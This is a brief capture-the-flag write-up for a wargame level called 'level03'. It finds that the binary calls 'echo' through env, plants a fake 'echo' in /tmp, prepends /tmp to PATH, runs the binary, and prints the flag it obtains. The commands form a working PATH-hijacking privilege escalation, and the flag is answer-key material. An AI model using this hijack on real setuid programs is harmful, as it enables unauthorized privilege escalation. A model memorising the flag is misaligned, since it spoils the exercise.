HINT:

ANSWER:
we do strings level03 and see:
/usr/bin/env echo Exploit me
ok let's try to exploit it, we do:
echo getflag > /tmp/echo && chmod +x /tmp/echo
then we need to add it to the path:
PATH=/tmp:$PATH
then we can just start ./level03 and we get:
qi0maab88jeaj46qoumi7maus